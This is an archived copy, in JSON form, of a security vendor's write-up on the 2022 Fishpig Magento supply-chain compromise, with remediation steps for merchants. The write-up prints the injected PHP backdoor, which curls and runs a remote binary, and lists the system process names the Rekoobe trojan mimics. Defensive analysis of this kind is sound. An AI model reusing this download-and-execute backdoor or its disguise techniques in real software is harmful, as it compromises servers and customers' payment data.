{
    "id": "aeb9084c-4721-4ee6-b77a-fb16d41caa9e",
    "created_at": "2023-01-12T15:08:05.457658Z",
    "updated_at": "2025-03-27T02:10:49.35438Z",
    "deleted_at": null,
    "sha1_hash": "eada9036aeea4afc05a547b81555211a99b1f573",
    "title": "2022-09-13 - Magento vendor Fishpig hacked, backdoors added",
    "authors": "",
    "file_creation_date": "2022-10-02T12:07:40Z",
    "file_modification_date": "2022-10-02T12:07:40Z",
    "file_size": 148870,
    "plain_text": "# Magento vendor Fishpig hacked, backdoors added\n\n**sansec.io/research/rekoobe-fishpig-magento**\n\nSeptember 13, 2022\n\n13th September 2022\n\n[Web Skimming / Sansec Threat Research](https://sansec.io/research)\nLearn about new eCommerce hacks?\n\nReceive an alert whenever we discover new hacks or vulnerabilities that may affect\nyour online store.\n\nWhat is\n\nMagecart?\n\nAlso known as digital skimming, this crime has surged since 2015. Criminals steal\ncard data during online shopping. Who are behind these notorious hacks, how does it\nwork, and how have Magecart attacks evolved over time?\n\n[About Magecart](https://sansec.io/what-is-magecart)\n\n**Fishpig, a vendor of popular Magento-Wordpress integrations, has been hacked.**\n**Sansec found that attackers have injected malware in Fishpig software and taken**\n**control of Fishpig servers. Online stores running Fishpig software may now have the**\n\n\n-----\n\n**Rekoobe malware installed on their servers, effectively granting store**\n**administrator access to attackers.**\n\n**[Update 2022-09-13 FishPig has confirmed the incident and published a status page. It](https://fishpig.co.uk/security-announcements/#X20220913)**\nrecommends customers to upgrade and/or reinstall all FishPig modules.\n\n[Sansec discovered malware in the Fishpig Magento Security Suite and several other](https://www.fishpig.co.uk/magento/extensions/block-robots-stop-spam/)\nFishpig extensions for Magento 2. It is likely that all paid Fishpig extensions have been\ncompromised. Free extensions that are hosted on Github seem not to be affected.\n\nThe injected malware will install another piece of malware (“Rekoobe”) which hides as\nbackground process on the server.\n\nThe Fishpig distribution server was compromised on or before August 19th. Any Magento\nstore who installed or updated paid Fishpig software since then, is now likely running the\nRekoobe malware.\n\n[Fishpig software has over 200,000 downloads. It is not known how many stores use the](https://packagist.org/packages/fishpig/)\npaid extensions.\n\n## Next steps for merchants\n\nFishPig has stated that their repository is fully cleaned. Magento merchants are\nrecommended to:\n\n[1. Re-install all FishPig extensions per FishPig instructions](https://fishpig.co.uk/security-announcements/#X20220913)\n[2. Run a server-side malware scanner to detect installed malware & unauthorized](https://sansec.io/pricing)\n\nactivity. Use coupon `FISHPIG to use our scanner one month for free.`\n3. Restart the server to terminate any unauthorized background processes\n\n## Attack details: lic.bin is Rekoobe\n\nAttackers have added code to `License.php, which is normally used to validate a Fishpig`\nlicense. When a Magento staff user visits the Fishpig control panel in the Magento backend,\nthe malware downloads a Linux binary from `license.fishpig.co.uk . The name`\n```\nlic.bin may make it look like a license asset, but it is actually the Rekoobe remote\n\n```\naccess trojan.\n\n\n-----\n\n```\n$tmp /tmp/.varnish7684 ;\n\nif (file_exists($tmp)) {\n\n  $fp = fopen($tmp, 'w');\n\n  if (!flock($fp, LOCK_EX | LOCK_NB)) {\n\n    return $this->adminDomain;\n\n  } else {\n\n    fclose($fp);\n\n    @system(\"cd ~/;curl https://license.fishpig.co.uk/image/dev/lic.png -o\nlic.bin;chmod 777 lic.bin;./lic.bin '\" . $this->adminDomain . \"';rm lic.bin\");\n\n  }\n\n} else {\n\n  @system(\"cd ~/;curl https://license.fishpig.co.uk/image/dev/lic.png -o\nlic.bin;chmod 777 lic.bin;./lic.bin '\" . $this->adminDomain . \"';rm lic.bin\");\n\n}\n\n```\nRekoobe uses a configuration file called `/tmp/.varnish7684 . After launching, it removes`\nall malware files and remains in memory. It hides as a system process and mimics one of\nthe following system services:\n```\n/usr/sbin/cron -f\n\n/sbin/udevd -d\n\ncrond\n\nauditd\n\n/usr/sbin/rsyslogd\n\n/usr/sbin/atd\n\n/usr/sbin/acpid\n\ndbus-daemon --system\n\n/sbin/init\n\n/usr/sbin/chronyd\n\n/usr/libexec/postfix/master\n\n/usr/lib/packagekit/packagekitd\n\n\n```\nMeanwhile, it waits for commands from the C2 server located at `46.183.217.223`\n(Latvia).\n\nSansec has not detected follow-up abuse via the C2 server yet. We expect that access to\nthe affected stores may be sold in bulk on hacking forums.\n\n## Acknowledgements\n\n[Sansec eComscan has been updated to detect the latest Rekoobe malware varieties.](https://sansec.io/pricing)\n\nThanks to our partners [Jetrails &](https://jetrails.com/) [Hypernode for their invaluable help in analyzing this](https://www.hypernode.com/en/)\nattack!\n\n[data-size=\"large\" > Follow @sansecio](https://twitter.com/sansecio)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-13 - Magento vendor Fishpig hacked, backdoors added.pdf"
    ],
    "report_names": [
        "2022-09-13 - Magento vendor Fishpig hacked, backdoors added.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536085,
    "ts_updated_at": 1743041449,
    "ts_creation_date": 1664712460,
    "ts_modification_date": 1664712460,
    "files": {
        "pdf": "https://archive.orkl.eu/eada9036aeea4afc05a547b81555211a99b1f573.pdf",
        "text": "https://archive.orkl.eu/eada9036aeea4afc05a547b81555211a99b1f573.txt",
        "img": "https://archive.orkl.eu/eada9036aeea4afc05a547b81555211a99b1f573.jpg"
    }
}